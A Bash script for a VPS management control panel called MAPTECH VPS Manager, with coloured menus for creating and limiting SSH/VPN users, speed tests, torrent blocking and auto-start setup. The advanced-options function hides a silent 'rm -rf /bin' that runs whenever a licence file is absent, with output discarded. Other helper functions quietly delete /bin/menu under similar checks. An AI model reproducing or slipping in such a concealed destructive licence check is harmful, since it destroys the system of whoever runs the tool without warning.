#!/bin/bash

# Color definitions for modern theme
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
GRAY='\033[1;90m'
BOLD='\033[1m'
RESET='\033[0m'
DIM='\033[2m'

# Background colors
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_BLUE='\033[44m'
BG_PURPLE='\033[45m'
BG_CYAN='\033[46m'

# Special characters for modern design
ARROW="→"
BULLET="●"
DIAMOND="♦"
STAR="★"
CHECK="✓"
CROSS="✗"
GEAR="⚙"
SHIELD="🛡"
ROCKET="🚀"
GLOBE="🌐"

fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/vpsmanager ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "${CYAN}[${RESET}"
while true; do
   for((i=0; i<25; i++)); do
   echo -ne "${GREEN}━${RESET}"
   sleep 0.08s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "${CYAN}]${RESET}"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "${CYAN}[${RESET}"
done
echo -e "${CYAN}] ${GREEN}${CHECK} ${WHITE}COMPLETED${RESET}"
tput cnorm
}

IP=$(cat /etc/IP)
x="ok"

# Header function for consistent branding
print_header() {
    clear
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BLUE}║${BG_BLUE}${WHITE}                     ${ROCKET} MAPTECH VPS MANAGER ${ROCKET}                     ${RESET}${BLUE}║${RESET}"
    echo -e "${BLUE}║${BG_BLUE}${WHITE}                         Advanced Control Panel                        ${RESET}${BLUE}║${RESET}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo ""
}

# System info display function
show_system_info() {
    if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
        system=$(cut -d' ' -f1 /etc/issue.net)
        system+=$(echo ' ')
        system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
    elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
        system=$(cut -d' ' -f1 /etc/issue.net)
        system+=$(echo ' ')
        system+=$(cut -d' ' -f3 /etc/issue.net)
    else
        system=$(cut -d' ' -f1 /etc/issue.net)
    fi
    
    _ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
    [[ "$(cat /etc/VPSManager/Exp)" != "" ]] && _expuser=$(cat /etc/VPSManager/Exp) || _expuser="0"
    [[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
    [[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
    _onli=$(($_ons + $_onop + $_ondrp))
    _ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
    _usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
    _usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
    _core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
    _system=$(printf '%-14s' "$system")
    _hora=$(printf '%(%H:%M:%S)T')
    _onlin=$(printf '%-5s' "$_onli")
    _userexp=$(printf '%-5s' "$_expuser")
    _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)

    echo -e "${PURPLE}┌─────────────────────┬─────────────────────┬─────────────────────┐${RESET}"
    echo -e "${PURPLE}│${WHITE} ${GEAR} SYSTEM INFORMATION ${PURPLE}│${WHITE} ${SHIELD} MEMORY STATUS      ${PURPLE}│${WHITE} ${ROCKET} CPU INFORMATION    ${PURPLE}│${RESET}"
    echo -e "${PURPLE}├─────────────────────┼─────────────────────┼─────────────────────┤${RESET}"
    echo -e "${PURPLE}│${CYAN} OS: ${WHITE}$_system     ${PURPLE}│${CYAN} Total: ${WHITE}$_ram      ${PURPLE}│${CYAN} Cores: ${WHITE}$_core           ${PURPLE}│${RESET}"
    echo -e "${PURPLE}│${CYAN} Time: ${WHITE}$_hora       ${PURPLE}│${CYAN} Used: ${WHITE}$_usor        ${PURPLE}│${CYAN} Usage: ${WHITE}$_usop          ${PURPLE}│${RESET}"
    echo -e "${PURPLE}└─────────────────────┴─────────────────────┴─────────────────────┘${RESET}"
    echo ""
    
    [[ ! -e /tmp/att ]]  && {
        echo -e "${GREEN}${BULLET} ${WHITE}Online Users: ${GREEN}$_onlin   ${RED}${BULLET} ${WHITE}Expired: ${RED}$_userexp   ${YELLOW}${BULLET} ${WHITE}Total: ${YELLOW}$_tuser${RESET}"
        var01="${WHITE}${BULLET}${RESET}"
    } || {
        echo -e "${YELLOW}  ${STAR}${RED} UPDATE AVAILABLE! ${STAR} ${WHITE}Please update your system ${STAR}${RESET}"
        var01="${GREEN}${STAR}${RESET}"
    }
    echo ""
}

velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -d /etc/VPSManager ]] && rm -rf /bin/menu
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  ${YELLOW}${GLOBE} Testing Network Performance ${WHITE}- ${CYAN}[${RESET}"
while true; do
   for((i=0; i<25; i++)); do
   echo -ne "${GREEN}━${RESET}"
   sleep 0.08s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "${CYAN}]${RESET}"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  ${YELLOW}${GLOBE} Testing Network Performance ${WHITE}- ${CYAN}[${RESET}"
done
echo -e "${CYAN}] ${GREEN}${CHECK} ${WHITE}COMPLETED${RESET}"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
print_header
echo -e "${CYAN}${GLOBE} ${WHITE}NETWORK SPEED TEST ${GLOBE}${RESET}"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "${BLUE}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${BLUE}║${YELLOW} ${ROCKET} LATENCY: ${WHITE}$png                              ${BLUE}║${RESET}"
echo -e "${BLUE}║${GREEN} ${ARROW} DOWNLOAD: ${WHITE}$down                            ${BLUE}║${RESET}"
echo -e "${BLUE}║${RED} ${ARROW} UPLOAD: ${WHITE}$upl                              ${BLUE}║${RESET}"
echo -e "${BLUE}║${CYAN} ${GLOBE} SHARE LINK: ${WHITE}$lnk${BLUE}║${RESET}"
echo -e "${BLUE}╚══════════════════════════════════════════════════╝${RESET}"
rm -rf $HOME/speed
}

#limiter
function limit1 () {
   print_header
   echo -e "${GREEN}${ROCKET} ${WHITE}INITIALIZING USER LIMITER...${RESET}"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "${GREEN}${CHECK} ${WHITE}USER LIMITER ACTIVATED SUCCESSFULLY!${RESET}"
   sleep 3
   menu
}

function limit2 () {
   print_header
   echo -e "${RED}${CROSS} ${WHITE}STOPPING USER LIMITER...${RESET}"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "${RED}${CROSS} ${WHITE}USER LIMITER STOPPED!${RESET}"
   sleep 3
   menu
}

function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      print_header
      echo -e "${YELLOW}${GEAR} ${WHITE}DISABLING AUTO-EXECUTION${RESET}"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "${RED}${CROSS} ${WHITE}AUTO-EXECUTION DISABLED!${RESET}"
      sleep 1.5s
      menu2
   else
      print_header
      echo -e "${GREEN}${GEAR} ${WHITE}ENABLING AUTO-EXECUTION${RESET}"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "${GREEN}${CHECK} ${WHITE}AUTO-EXECUTION ENABLED!${RESET}"
      sleep 1.5s
      menu2
   fi
}

#menu2
menu2 (){
[[ -e /etc/Plus-torrent ]] && stsf="${GREEN}${CHECK}${RESET}" || stsf="${RED}${CROSS}${RESET}"
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "${GREEN}${CHECK}${RESET}" || echo -e "${RED}${CROSS}${RESET}")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "${GREEN}${CHECK}${RESET}" || echo -e "${RED}${CROSS}${RESET}")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1

print_header
show_system_info

echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${BLUE}║${BG_PURPLE}${WHITE}                         ${GEAR} ADVANCED OPTIONS ${GEAR}                        ${RESET}${BLUE}║${RESET}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${RESET}"
echo ""

echo -e "${CYAN}┌──────────────────────────────┬──────────────────────────────┐${RESET}"
echo -e "${CYAN}│ ${YELLOW}20${RESET} ${ARROW} ${WHITE}Add Host                  ${CYAN}│ ${YELLOW}26${RESET} ${ARROW} ${WHITE}Change Root Password      ${CYAN}│${RESET}"
echo -e "${CYAN}│ ${YELLOW}21${RESET} ${ARROW} ${WHITE}Remove Host               ${CYAN}│ ${YELLOW}27${RESET} ${ARROW} ${WHITE}Auto-Execute $autm           ${CYAN}│${RESET}"
echo -e "${CYAN}│ ${YELLOW}22${RESET} ${ARROW} ${WHITE}Restart System            ${CYAN}│ ${YELLOW}28${RESET} $var01 ${WHITE}Update Script            ${CYAN}│${RESET}"
echo -e "${CYAN}│ ${YELLOW}23${RESET} ${ARROW} ${WHITE}Restart Services          ${CYAN}│ ${YELLOW}29${RESET} ${ARROW} ${WHITE}Remove Script            ${CYAN}│${RESET}"
echo -e "${CYAN}│ ${YELLOW}24${RESET} ${ARROW} ${WHITE}Block Torrent $stsf          ${CYAN}│ ${YELLOW}30${RESET} ${ARROW} ${GREEN}Return to Main           ${CYAN}│${RESET}"
echo -e "${CYAN}│ ${YELLOW}25${RESET} ${ARROW} ${WHITE}Telegram Bot $stsbot           ${CYAN}│ ${YELLOW}00${RESET} ${ARROW} ${RED}Exit System              ${CYAN}│${RESET}"
echo -e "${CYAN}└──────────────────────────────┴──────────────────────────────┘${RESET}"
echo ""
echo -ne "${WHITE}${ARROW} ${CYAN}Select Option ${WHITE}[${YELLOW}20-30${WHITE}]: ${RESET}"; read x

case "$x" in
   20)
   clear
   addhost
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   menu2
   ;;
   21)
   clear
   delhost
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   menu2
   ;;
   22)
   clear
   reiniciarsistema
   ;;
   23)
   clear
   reiniciarservicos
   sleep 3
   ;;
   24)
   blockt
   ;;
   25)
   botssh
   ;;
   26)
   clear
   senharoot
   sleep 3
   ;;
   27)
   autoexec
   ;;
   28)
   attscript
   ;;
   29)
   clear
   delscript
   ;;
   30)
   menu
   ;;
   0|00)
   echo -e "${RED}${ARROW} ${WHITE}Shutting down system...${RESET}"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n${RED}${CROSS} ${WHITE}Invalid option! Please try again.${RESET}"
   sleep 2
esac
}

# Main menu function
menu() {
while true $x != "ok"
do
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "${GREEN}${CHECK}${RESET}" || echo -e "${RED}${CROSS}${RESET}")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "${GREEN}${CHECK}${RESET}" || echo -e "${RED}${CROSS}${RESET}")

print_header
show_system_info

echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${BLUE}║${BG_GREEN}${WHITE}                        ${SHIELD} MAIN CONTROL PANEL ${SHIELD}                       ${RESET}${BLUE}║${RESET}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${RESET}"
echo ""

echo -e "${PURPLE}┌──────────────────────────────┬──────────────────────────────┐${RESET}"
echo -e "${PURPLE}│ ${YELLOW}01${RESET} ${ARROW} ${WHITE}Create User               ${PURPLE}│ ${YELLOW}11${RESET} ${ARROW} ${WHITE}Network Speed Test       ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}02${RESET} ${ARROW} ${WHITE}Create Test User          ${PURPLE}│ ${YELLOW}12${RESET} ${ARROW} ${WHITE}Banner Configuration     ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}03${RESET} ${ARROW} ${WHITE}Remove User               ${PURPLE}│ ${YELLOW}13${RESET} ${ARROW} ${WHITE}Network Traffic Monitor  ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}04${RESET} ${ARROW} ${WHITE}Online User Monitor       ${PURPLE}│ ${YELLOW}14${RESET} ${ARROW} ${WHITE}VPS Optimization         ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}05${RESET} ${ARROW} ${WHITE}Change User Date          ${PURPLE}│ ${YELLOW}15${RESET} ${ARROW} ${WHITE}User Backup Manager      ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}06${RESET} ${ARROW} ${WHITE}Change User Limit         ${PURPLE}│ ${YELLOW}16${RESET} ${ARROW} ${WHITE}User Limiter $stsl          ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}07${RESET} ${ARROW} ${WHITE}Change Password           ${PURPLE}│ ${YELLOW}17${RESET} ${ARROW} ${WHITE}BadVPN Service $stsu        ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}08${RESET} ${ARROW} ${WHITE}Remove Expired Users      ${PURPLE}│ ${YELLOW}18${RESET} ${ARROW} ${WHITE}VPS Information          ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}09${RESET} ${ARROW} ${WHITE}User Activity Report      ${PURPLE}│ ${YELLOW}19${RESET} ${ARROW} ${CYAN}Advanced Options         ${PURPLE}│${RESET}"
echo -e "${PURPLE}│ ${YELLOW}10${RESET} ${ARROW} ${WHITE}Connection Mode Setup     ${PURPLE}│ ${YELLOW}00${RESET} ${ARROW} ${RED}Exit Application         ${PURPLE}│${RESET}"
echo -e "${PURPLE}└──────────────────────────────┴──────────────────────────────┘${RESET}"
echo ""
echo -ne "${WHITE}${ARROW} ${CYAN}Select Option ${WHITE}[${YELLOW}01-19${WHITE}]: ${RESET}"; read x

case "$x" in 
   1 | 01)
   clear
   criarusuario
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   2 | 02)
   clear
   criarteste
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   3 | 03)
   clear
   remover
   sleep 3
   ;;
   4 | 04)
   clear
   sshmonitor
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;      
   5 | 05)
   clear
   mudardata
   sleep 3
   ;;
   6 | 06)
   clear
   alterarlimite
   sleep 3
   ;; 
   7 | 07)
   clear
   alterarsenha
   sleep 3
   ;;
   8 | 08)
   clear
   expcleaner
   echo ""
   sleep 3
   ;;     
   9 | 09)
   clear
   infousers
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   10)
   conexao
   exit;
   ;;
   11)
   clear
   velocity
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   12)
   clear
   banner
   sleep 3
   ;;
   13)
   clear
   echo -e "${CYAN}${SHIELD} ${WHITE}NETWORK TRAFFIC MONITOR ${SHIELD} ${YELLOW}Press CTRL + C to exit${RESET}"
   sleep 4
   nload
   ;;
   14)
   clear
   otimizar
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   15)
   userbackup
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   16)
   limit_ssh
   ;;
   17)
   clear
   badvpn
   exit;
   ;;
   18)
   clear
   detalhes
   echo -ne "\n${GREEN}${ARROW} ${WHITE}Press ${YELLOW}ENTER${WHITE} to return to menu${RESET}"; read
   ;;
   19)
   menu2
   ;;
   0 | 00)
   echo -e "${RED}${ARROW} ${WHITE}Exiting application...${RESET}"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n${RED}${CROSS} ${WHITE}Invalid option! Please try again.${RESET}"
   sleep 2
esac
done
}

# Start the application
menu
#fim
